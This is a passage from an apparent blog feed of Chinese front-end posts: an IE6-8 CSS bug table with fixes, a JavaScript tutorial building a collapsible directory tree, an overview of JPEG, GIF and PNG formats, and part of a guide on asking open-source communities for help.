target="_blank">fixed</a></td><td>给a添加background, 如果背景透明，使用background:url("任何页面中已经缓存的文件链接")，不推荐background：url(#)[<a href="http://haslayout.net/css/Partial-Click-Bug-v2" target="_blank">官方的解决方法</a>]，因为会增加一下HTTP请求</td></tr><tr><td>20</td><td>float列表元素不水平对齐：li不设置float，a设置display:block;float:[方向]，li不水平对齐</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/staircase-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/staircase-bug-demo-fixed.html" target="_blank">fixed</a></td><td>给li设置display:inline 或 float:[方向]</td></tr><tr><td>21</td><td>dt, dd, li 背景失效</td><td>IE6</td><td><a href="http://haslayout.net/demos/disappearing-list-background-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/disappearing-list-background-bug-demo-fixed.html" target="_blank">fixed</a></td><td>dt, dd, li{position:relative;} (base.<a class="st_tag internal_tag" title="Posts tagged with CSS" href="http://www.iwanna.cn/tags/css/" rel="tag nofollow">css</a>中已包含)</td></tr><tr><td>22</td><td>&lt;noscript /&gt;元素的样式在启用javascript的情况下显示了样式</td><td>IE6-8</td><td><a href="http://haslayout.net/demos/noscript-ghost-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/noscript-ghost-bug-demo-fixed.html" target="_blank">fixed</a></td><td>利用js给&lt;noscript /&gt;添加display:none;</td></tr><tr><td>23</td><td>使用filter处理的透明背景图片的透明部分不可点</td><td>IE6-8</td><td><a href="http://haslayout.net/demos/no-transparency-click-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/no-transparency-click-bug-demo-fixed.html" target="_blank">fixed</a></td><td>把background:none变成background:url("链接")，链接到本身和图片之外的任何文件</td></tr><tr><td>24</td><td>li内元素偏离 baseline 向下拉</td><td>IE8</td><td><a href="http://haslayout.net/demos/list-drop-shift-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/list-drop-shift-bug-demo-fixed.html" target="_blank">fixed</a></td><td>给li设置display:inline 或 float:[方向]</td></tr><tr><td>25</td><td>列表中li的list-style不显示</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/no_li_ol_bullets_demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/no_li_ol_bullets_demo_fixed.html" target="_blank">fixed</a></td><td>给li添加margin-left，留空间来显示（不要加在ul上）</td></tr><tr><td>26</td><td>图片不能垂直居中</td><td>IE6/7</td><td><a href="http://haslayout.net/css/No-line-height-Vertical-Center-on-Images-Bug" target="_blank">bug/fixed</a></td><td>添加一个空标签，并赋给"Layout", 比如display:inline-block;</td></tr><tr><td>27</td><td>不能自定义指针样式</td><td>IE6-8</td><td><a href="http://haslayout.net/demos/cursor/a/demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/cursor/a/demo_fixed.html" target="_blank">fixed</a></td><td>给指针文件设置绝对路径</td></tr><tr><td>28</td><td>背景溢出，拖动滚动条后显示正常</td><td>IE6</td><td><a href="http://haslayout.net/demos/backgroundleak_demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/backgroundleak_demo_ls_fixed.html" target="_blank">fixed</a></td><td>给父元素添加overflow:hidden防止溢出，并赋予hasLayout,如果添加_zoom:1;</td></tr><tr><td>29</td><td>高度超过height定义的高</td><td>IE6</td><td><a href="http://haslayout.net/css/Expanding-Height-Bug" target="_blank">bug/fixed</a></td><td>添加_overflow:hidden;(推荐)或者_font-size:0;</td></tr><tr><td>30</td><td>宽度超过width定义的宽</td><td>IE6</td><td><a href="http://haslayout.net/css/Expanding-Width-Bug" target="_blank">bug/fixed</a></td><td>添加_overflow:hidden; 或使用alice v3 中的 .sl-word-break 类（table用.sl-table-break）</td></tr><tr><td>31</td><td>双倍边距</td><td>IE6</td><td>─ 常识</td><td>添加display:inline到float元素中</td></tr><tr><td>32</td><td>margin负值隐藏：hasLayout的父元素内的非hasLayout元素，使用负边距时，超出父元素部分不可见</td><td>IE6/7</td><td><a href="http://haslayout.net/css/Negative-Margin-Bug" target="_blank">bug/fixed</a></td><td>去掉父元素的hasLayout；或者赋hasLayout给子元素,并添加position:relative;</td></tr><tr><td>33</td><td>给两个浮动元素的某中一个的文字设定为斜体，另一个元素下拉在有斜体文字元素的下面</td><td>IE6</td><td><a href="http://haslayout.net/css/Italics-Float-Bug" target="_blank">bug/fixed</a></td><td>给有斜体文字的元素添加overflow:hidden;</td></tr><tr><td>35</td><td>3px 间隔：在float元素后的元素，会有3px间隔</td><td>IE6</td><td><a href="http://haslayout.net/css/3px-Gap-Bug-aka-Text-Jog-Bug" target="_blank">bug/fixed</a></td><td>因为是确切的3px，所以，用\暴力破解"吧，比如_margin-left:-3px;</td></tr><tr><td>35</td><td>text-align 影响块级元素</td><td>IE6/7</td><td><a href="http://haslayout.net/css/Text-Align-Bug" target="_blank">bug/fixed</a></td><td>整理你的float；或者分开设置text-alig</td></tr></tbody></table><pre>总之万恶的IE6是这么的"与众不同"。以后我会持续更新这篇日志，记录更多的BUG，直到IE6消失！本文转自：<a href="http://www.cnblogs.com/Kampfer/archive/2010/07/25/1784723.html" target="_blank">Kampfer的记事本</a></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 兼容性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS动态构建一棵目录树</title>
      <link href="/blog/2013/04/22/cb-make-a-tree/"/>
      <url>/blog/2013/04/22/cb-make-a-tree/</url>
      
        <content type="html"><![CDATA[<p>在使用frameset布局的时候，经常会用到目录树，我们可以把一棵树写死，但是更多的情况是，这棵树需要随时被改动，所以我们期望的是他能够被动态的构建。</p><p>MVC，算是了解一点，那本文就把这棵树根据M-V-C给拆开分解吧。</p><p><img src="https://images.cnitblog.com/blog/387325/201304/22110251-818c9f213e1241cf8c88b5a769638ede.png" alt=""></p><p><a title="DEMO" href="http://qianduannotes.sinaapp.com/test/tree.html" target="_blank">点击链接demo→</a></p><p>下面就来看看这棵树是怎么构建的。　</p><p>　</p><h3>Module [数据层]</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var tree</span> = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: 0,</span><br><span class="line">            <span class="string">&quot;a1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;a1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;children&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;b1&quot;</span>: <span class="string">&quot;b1_1&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;b2&quot;</span>: <span class="string">&quot;b1_2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;b3&quot;</span>: <span class="string">&quot;b1_3&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;a2&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;a2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;children&quot;</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;a3&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;a3&quot;</span>,</span><br><span class="line">                <span class="string">&quot;children&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;b1&quot;</span>: <span class="string">&quot;b3_1&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;b2&quot;</span>: <span class="string">&quot;b3_2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;b3&quot;</span>: <span class="string">&quot;b3_3&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一颗两层的目录树，用ID来表示层级关系，name来表示改层的名字（也就是节点Text内容吧）。</p><h3>Control [控制层]</h3><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var Tree = <span class="keyword">function</span> ( <span class="keyword">module</span> )&#123;</span><br><span class="line">    <span class="keyword">function</span> create<span class="constructor">NodeList( <span class="params">obj</span> )</span> &#123;</span><br><span class="line">        <span class="comment">//创建ul节点和documentFragmeng中间变量</span></span><br><span class="line">        var n = document.create<span class="constructor">Element(<span class="string">&quot;ul&quot;</span>)</span>,</span><br><span class="line">            docfrag = document.create<span class="constructor">DocumentFragment()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断obj是根节点还是孩子节点</span></span><br><span class="line">        <span class="keyword">if</span>(obj.id<span class="operator"> == </span><span class="number">0</span>) &#123;</span><br><span class="line">            n.set<span class="constructor">Attribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;tree_0&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(var key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">                <span class="keyword">if</span>(key<span class="operator"> == </span><span class="string">&quot;id&quot;</span>) continue;</span><br><span class="line">                <span class="comment">//将节点插入</span></span><br><span class="line">                var c = document.create<span class="constructor">Element(<span class="string">&quot;li&quot;</span>)</span>,</span><br><span class="line">                    span = document.create<span class="constructor">Element(<span class="string">&quot;span&quot;</span>)</span>;</span><br><span class="line">                span.append<span class="constructor">Child(<span class="params">document</span>.<span class="params">createTextNode</span>( <span class="params">obj</span>[<span class="params">key</span>].<span class="params">name</span> )</span>);</span><br><span class="line">                c.append<span class="constructor">Child(<span class="params">span</span>)</span>;</span><br><span class="line">                docfrag.append<span class="constructor">Child( <span class="params">c</span> )</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj.id<span class="operator"> &amp;&amp; </span>obj.id<span class="operator"> == </span><span class="number">1</span>) &#123;</span><br><span class="line">            n.set<span class="constructor">Attribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;tree_1&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(var key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">                <span class="keyword">if</span>(key<span class="operator"> == </span><span class="string">&quot;id&quot;</span><span class="operator"> || </span>key<span class="operator"> == </span><span class="string">&quot;name&quot;</span><span class="operator"> || </span>!obj.children) continue;</span><br><span class="line">                <span class="keyword">for</span>( var item <span class="keyword">in</span> obj.children)&#123;</span><br><span class="line">                    <span class="comment">//将节点插入</span></span><br><span class="line">                    var c = document.create<span class="constructor">Element(<span class="string">&quot;li&quot;</span>)</span>;</span><br><span class="line">                    c.append<span class="constructor">Child(<span class="params">document</span>.<span class="params">createTextNode</span>( <span class="params">obj</span>.<span class="params">children</span>[<span class="params">item</span>] )</span>);</span><br><span class="line">                    docfrag.append<span class="constructor">Child( <span class="params">c</span> )</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        n.append<span class="constructor">Child( <span class="params">docfrag</span> )</span>;</span><br><span class="line">        <span class="comment">//返回开始构建的ul节点</span></span><br><span class="line">        return n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//隐藏及显示 工具函数</span></span><br><span class="line">    <span class="keyword">function</span> toggle(c)&#123;</span><br><span class="line">        c.style.display = ((c.style.display<span class="operator"> == </span><span class="string">&quot;none&quot;</span>) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;none&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> create<span class="constructor">Tree( <span class="params">obj</span> )</span> &#123;</span><br><span class="line">        var root, child, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        root = create<span class="constructor">NodeList( <span class="params">obj</span> )</span>;</span><br><span class="line">        <span class="keyword">for</span>(var key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">            <span class="keyword">if</span>(obj<span class="literal">[<span class="identifier">key</span>]</span><span class="operator"> == </span><span class="string">&quot;id&quot;</span><span class="operator"> || </span>!obj<span class="literal">[<span class="identifier">key</span>]</span>.children) continue;</span><br><span class="line">            child = create<span class="constructor">NodeList(<span class="params">obj</span>[<span class="params">key</span>])</span>;</span><br><span class="line">            root.children<span class="literal">[<span class="identifier">count</span>]</span>.append<span class="constructor">Child( <span class="params">child</span> )</span>;</span><br><span class="line">            <span class="comment">//count来判断插入的位置</span></span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        return root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var T = create<span class="constructor">Tree(<span class="params">module</span>)</span>;</span><br><span class="line">    var <span class="built_in">list</span> = <span class="module-access"><span class="module"><span class="identifier">T</span>.</span></span>children;</span><br><span class="line">    <span class="keyword">for</span>(var i = <span class="number">0</span>, len = <span class="built_in">list</span>.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="built_in">list</span><span class="literal">[<span class="identifier">i</span>]</span>.get<span class="constructor">ElementsByTagName(<span class="string">&quot;span&quot;</span>)</span><span class="literal">[<span class="number">0</span>]</span>.onclick = <span class="keyword">function</span><span class="literal">()</span>&#123;</span><br><span class="line">            var obj = this.nextSibling;</span><br><span class="line">            toggle(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里边创建了三个函数，其中</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">createNodeList</span><span class="params">()</span></span> <span class="comment">//适用于构建一个树子节点</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中使用documentFragment作为一个节点缓存器，先把节点放置到documentFragment中，然后统一插入到ul，这也是比较常用的使用方式。</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">createTree</span><span class="params">()</span></span> <span class="comment">//构建一棵树</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>基本整棵树的构建就是分为这两步，前者负责创建一个子节点，后者构建一棵树。</p><p>在这颗树中绑定了click事件，让其可以折叠，当然也可以在Tree这个类里绑定更多的方法，这个就靠自己发挥了。</p><h3>View [视图层]</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> T = <span class="keyword">new</span> <span class="title class_">Tree</span>(tree);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(T);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整棵树的构建，主要用到的是DOM元素的处理，这个必须牢牢掌握！</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最受欢迎的几种图片格式及其常见用法</title>
      <link href="/blog/2013/04/22/cb-category-of-picture/"/>
      <url>/blog/2013/04/22/cb-category-of-picture/</url>
      
        <content type="html"><![CDATA[<p><span>　　从某种程度上说，判断一个网页设计师是否优秀，可以从其在WEB开发（或网页设计）中是否合理的采用各种图片格式得出结论。事实上，或许所有人都知道图片存在GIF,JPG和PNG等格式，但并非所有人都知道它们之间的具体区别和使用技巧。</span><span>　　接下来，将给大家介绍：WEB开发中几种最受欢迎图片格式的前世今生以及如何正确的使用它们。</span></p><h3>JPEG</h3><p><span>　　JPEG格式是一种大小与质量相平衡的压缩图片格式。通俗一点讲，就是：高的压缩比=低的图片质量=小的文件大小。反之，低的压缩比=高的图片质量=大的文件大小。由于JPEG文件无法保持100 ％的原始图像的像素数据，所以它不被认为是一种无损图像格式。</span></p><p><strong>用途：</strong><span>　　由于这种极其敏感的平衡特性，JPEG非常适合被应用在那些允许轻微失真的像素色彩丰富的图片（照片）场合。反之，JPEG格式图片并不适合做简单色彩（色调少）的图片，比如LOGO，各种小图标（ICONS）。</span></p><h3>GIF</h3><p><span>　　GIF格式，是为使图片能够应用在在线（online）应用程序上所特别开发的图片格式。Gif，有时也被成为\Giff"，是一种无损，8位图片格式。\无损"是指100%的保持原始图片的像素数据信息。专业名词\8位"是指，所能表现的颜色深度&mdash;&mdash;一个8位图像仅最多只能支持256种不同颜色（一个多余256种颜色的图片若用gif图片保存会出现失真）。</span></p><p><strong>用途：</strong><span>　　由于8位颜色深度的限制，Gif不适合应用于各种色彩过于丰富的照片存储场合。但它却非常适合应用在以下场合：</span></p><ul><li><span>Logo</span></li><li><span>小图标（Icon）</span></li><li><span>用于布局的图片（例如某个布局角落，边框等等）</span></li><li><span>仅包含不超过256种色彩的简单，小型图片场合</span></li></ul><p><strong>透明特性：</strong><span>　　GIF支持基本的透明特性，这意味着你能够使图片的某些像素\不可见"。在其被放置到网页中时，我们就可以看到通过这些不可见区域看到此图片后面的背景颜色（图片）。此特性非常有用：如果你需要将某个gif图片的内容置于所有图片的上层，你可以将其设置为透明。</span></p><p><strong>压缩特性：</strong><span>　　GIF格式采用LZW算法进行压缩，此算法是Unisys申请的一项专利。在很久很久之前，如果你想使用GIF格式，那么就意味着你需要向Unisys付费申请专利许可。不过值得高兴的是，此项专利技术已于2003年6月20日过期，我们现在可以免费的使用GIF了！</span></p><p><strong>隔行扫描：</strong><span>　　GIF同时也支持隔行扫描。隔行扫描能够令图片在浏览器中更快的加载和显示。此特性对于那些慢网速的浏览者来说尤其实用。</span></p><p><strong>动画GIF：</strong><span>　　一个动态的GIF文件，是由若干帧图片所联结而成的动态图片。在显示时，这些动态帧被反复的绘制读取出来从而形成了简单的动画效果。合理的运用GIF动画能够为网页增添动静结合的效果，而过度的使用则会使网页杂乱无章。</span></p><h3><strong>PNG</strong></h3><p><span>　　PNG，读\ping"，初始时被作为GIF的免费替代格式所开发，采用公共专利压缩算法。PNG格式也是一种无损压缩，但与GIF格式不同的是，PNG同时支持8位和24位的图像。</span></p><p><strong>8位PNG图像：</strong><span>　　一个8位PNG图片，支持透明背景且像素颜色不能超过256种。除了压缩算法不同之外，此8位PNG格式与GIF格式极其相似；</span></p><p><strong>用途：</strong><span>　　8位PNG图片的用途与GIF格式基本相同，</span></p><ul><li><span>Logo</span></li><li><span>小图标（Icon）</span></li><li><span>用于布局的图片（例如某个布局角落，边框等等）</span></li><li><span>仅包含不超过256种色彩的简单，小型图片场合</span></li></ul><p><strong>24位PNG图像：</strong><span>　　24位PNG，支持160万种不同的像素颜色且支持Alpha透明效果，这就意味着，无论透明度设置为多少，PNG图片均能够与背景很好的融合在一起。</span></p><p><strong>对PNG的支持：</strong><span>　　由于PNG格式的广泛使用和开发者更加重视网页的WEB标准，不同浏览器对PNG的支持就显得相当重要了。不过，幸运的是，目前市场上主流的浏览器对PNG格式都有很好的支持，这包括：IE*, Firefox, Safari, Opera, and Konqueror。</span><span>　　但不幸的是，IE6及IE6以下的浏览器对PNG透明背景的支持并不好。不过我们仍可以通过其他方法来解决这个问题，详情请查看如何在IE6中正常显示透明PNG。</span></p>]]></content>
      
      
      <categories>
          
          <category> 剪贴板 </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何向开源社区提问题</title>
      <link href="/blog/2013/04/22/cb-how-to-ask-quertion/"/>
      <url>/blog/2013/04/22/cb-how-to-ask-quertion/</url>
      
        <content type="html"><![CDATA[<p>大家提问题前，请仔细阅读下这篇文章。高质量的提问，不光有助于问题的快速解决，还能赢得社区的尊重。</p><hr><h1>如何向开源社区提问题</h1><p>使用软件产品，或多或少都会遇到问题。对于商业产品，我们可以咨询客服寻求帮助。对于公司自己研发的产品，我们可以直接请教专家同事。但对于开源软件，在遇到问题时，如何才能及时有效地寻求帮助呢？</p><p>本文以开源类库&nbsp;<a href="http://seajs.org/">Sea.js</a>&nbsp;为例，说说我心目中的最佳实践。</p><h3><a class="anchor" name="-1" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-1"></a>提问前</h3><p>遇到问题时，心里都很着急。在决定向开源社区提交问题前，最好先做做以下功课：</p><h4><a class="anchor" name="-2" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-2"></a><strong>尝试从官方文档中找到答案</strong></h4><p>确保自己阅读过至少一次官方文档。这样在遇到问题时，如果能回忆起只言片语，就可以再去读一遍相关文档，问题往往也就解决了。</p><h4><a class="anchor" name="google-" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#google-"></a><strong>Google 是你的朋友</strong></h4><p>对于成熟的开源项目，你遇到的问题，很可能别人也遇到过。这时通过 Google、StackOverflow 等网站的搜索服务，可以帮你快速定位并解决问题。永远记住，地球上的你并不孤单，包括你遇到的问题。</p><h4><a class="anchor" name="-bug-" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-bug-"></a><strong>挖掘 Bug 宝藏</strong></h4><p>开源软件一般都会有自己的 Bug 管理方案，比如 WebKit、V8、jQuery、Sea.js 等等。从它们的官网上找到 Bug 管理地址，然后通过搜索看看有无你遇到的问题。对于活跃社区来说，这一招经常很管用。比如 jQuery 的&nbsp;<a href="http://bugs.jquery.org/">Bug Tracker</a>，通过右上角的 Search Tickets 可以找到非常多有用的信息。一个运作良好的 Bug 库，经常是一座巨大的宝藏。Sea.js 是直接通过&nbsp;<a href="//github.com/seajs/seajs/issues">GitHub Issues</a>&nbsp;来管理，你可以在 Issues 中找到很多信息。</p><h4><a class="anchor" name="-3" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-3"></a><strong>求助身边的朋友</strong></h4><p>如果你使用的开源软件，在朋友圈或同事圈里也有人使用，那么抬起你的脚、或拿起你的电话，真挚诚恳的探讨不会遭遇拒绝，而会增进友谊。不要犹豫，你的内心渴望面对面交流，你的朋友也是。</p><p>如果以上 4 步都无法解决你遇到的问题，也别犹豫，立马向开源社区提交问题就好。</p><h3><a class="anchor" name="-4" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-4"></a>提问时</h3><p>提问有很多种，比如你认识作者，直接面对面请教就行。下面探讨的是如何通过互联网的方式来问问题。</p><h4><a class="anchor" name="-5" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-5"></a><strong>平和对等的心态</strong></h4><p>很多开源软件都是免费的，作者往往是业余时间出于兴趣在维护，没有义务回答社区问题。提问时，不要把自己摆在顾客的位置，比如</p><blockquote><p>项目马上要上线了，请务必帮忙解决 这是我的邮箱，请及时联系我</p></blockquote><p>另外，也不要把自己摆在乞食者的位置，比如</p><blockquote><p>冰天雪地跪求解答 救命啊，我的网站挂了</p></blockquote><p>在开源社区，一切皆是朋友。无论对方是 Linux 内核的作者，还是某个 jQuery 插件的作者，你和作者都是对等的。你的提问是在帮助开源软件完善。平和对等的心态，可以让你的问题赢得更多人的阅读和思考。</p><h4><a class="anchor" name="-6" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-6"></a><strong>通过正确的途径提交</strong></h4><p>如果遇到问题的开源软件有专门的 Bug 管理系统，请最好到这些指定系统中提交。比如，对于前端开发工程师来说，下面这些 Tracker 系统很重要。</p><ul><li><a href="http://bugs.jquery.com/report">jQuery Tickets</a></li><li><a href="//bugs.webkit.org/">WebKit Bugzilla</a></li><li><a href="//bugzilla.mozilla.org/">Mozilla Bugzilla</a></li></ul><p>还有各个开源类库的 Issues 库，比如 Sea.js 的是：<a href="//github.com/seajs/seajs/issues">seajs/issues</a></p><p>最不好的途径是</p><ul><li><p>QQ 、阿里旺旺、微信等群组。这些群组主要是用来工作或休闲的。对开源项目来说，在这些地方提问，作者一般不会关注，效率非常低。</p></li><li><p>微博、Facebook 等社交网络。不少人在微博上通过 at 或私信询问 Sea.js 问题，这些我经常看不到。看到了，也不情愿回复。微博是扯淡、交流情感的地方，一般是写代码写累了，才去逛逛，很少会有在社交网络上回答技术问题的心情。</p></li></ul><p>通过正确的途径提交问题，一般可以让你的问题得到及时准确的回复。</p><h4><a class="anchor" name="-7" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-7"></a><strong>使用明确、有意义的标题</strong></h4><p>抱着平和对等的心态，找到合适的途径后，就得静下心来将遇到的问题写成文字。书写文字不是一件简单的事情，我们可以从遵循一些简单的规则开始。</p><p>首先是标题要简洁清晰，要言之有物。比如</p><blockquote><p>我遇到了一个 Ajax 问题 Sea.js 在我的浏览器上运行不了</p></blockquote><p>上面的标题很糟糕，光看标题作者无法知道发生了什么事。当开源社区的问题很多时，上面这类标题，经常会让作者直接忽视或将优先级降到很低。更妥当的标题是</p><blockquote><p>Ajax 请求未返回正确的 responseXML Sea.js 2.0 在 IE6 上运行时抛错</p></blockquote><p>明确、有意义的标题，可以帮助作者确定问题具体是什么类型、预估需要多少时间解决、是否现在马上解决等。一个好的标题，也有利于社区知识的沉淀和后期搜索。标题有如一个人的颜面衣着，虽然不是关键，但在嘈杂的信息社区中，这很重要。</p><h4><a class="anchor" name="-8" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-8"></a><strong>遵循良好的模板</strong></h4><p>如果社区提供了问题模板，一定要仔细看下。比如 Google Code 社区，当你创建一个问题时，会自动提供以下模板：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">What steps will reproduce <span class="keyword">the</span> problem?</span><br><span class="line">该问题的重现步骤是什么？</span><br><span class="line"><span class="number">1.</span></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="number">3.</span></span><br><span class="line"></span><br><span class="line">What is <span class="keyword">the</span> expected output? What <span class="built_in">do</span> you see instead?</span><br><span class="line">你期待的结果是什么？实际看到的又是什么？</span><br><span class="line"></span><br><span class="line">What <span class="built_in">version</span> <span class="keyword">of</span> <span class="keyword">the</span> product are you <span class="keyword">using</span>? On what operating <span class="keyword">system</span>?</span><br><span class="line">你正在使用产品的哪个版本？在什么操作系统上？</span><br><span class="line"></span><br><span class="line">Please provide <span class="keyword">any</span> additional information below.</span><br><span class="line">如果有的话，请在下面提供更多信息。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>遵循这个模板去描述问题，经常能省很多事。作者一般也非常欢迎通过模板提交的问题。如果社区没有提供模板，也可以自己遵循以上模板来提交。</p><p>下面针对问题内容，具体说说一些需要注意的点。</p><h4><a class="anchor" name="-9" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-9"></a><strong>语法正确、格式清晰</strong></h4><p>虽然我们不是作家，但正确的语法、清晰的格式，可以让读者赏心悦目，也就更有心情帮你一起思考解决问题。</p><p>对于很多需要代码来描述的问题，要尤其注意格式，比如</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">seajs.<span class="title function_">use</span>(<span class="string">&#x27;jquery&#x27;</span>,<span class="keyword">function</span>(<span class="params">$</span>)&#123;$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="comment">/* ... */</span> &#125;)&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可读性不如</p><div class="highlight"><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">seajs.<span class="title function_">use</span>(<span class="string">&#x27;jquery&#x27;</span>, <span class="keyword">function</span>(<span class="params">$</span>) &#123;</span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>GitHub 的 Markdown 语法可以很好地支持代码排版、语法高亮等，建议书写代码时，一定要先阅读下说明：<a href="http://github.github.com/github-flavored-markdown/">GitHub Flavored Markdown</a>。这能让你的内容看起来很专业，社区也就更有意愿会去帮助你，否则糟糕的排版，经常带来的是发帖之后的石沉大海。</p><h4><a class="anchor" name="-10" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-10"></a><strong>描述事实、而不是猜测</strong></h4><p>事实是指，依次进行了哪些操作、产生了怎样的结果。比如</p><blockquote><p>我在 Windows XP 下用 IE6 打开&nbsp;<a href="http://seajs.org/">seajs.org</a>&nbsp;后，点击\5 分钟上手 Sea.js"，这时浏览器弹出脚本错误提示，例子显示不正确。</p></blockquote><p>上面是一段比较好的事实描述（更好的是把错误提示也截图上来），而不要像下面这样猜测：</p><blockquote><p>Sea.js 在 IE6 下运行不正常，我怀疑是源码第 213 行有问题。</p></blockquote><p>上面的描述，会让作者一头雾水、甚至很恼火。尽量避免猜测性描述，除非你能先描述事实，在事实描述清楚之后，再给出合理的猜测是欢迎的。</p><p>对于前端项目来说，如果能提供可重现错误的在线可访问代码，那是最好不过的。一旦你这么用心去做了，作者往往也会很用心地立马帮你解决。</p><h4><a class="anchor" name="-11" 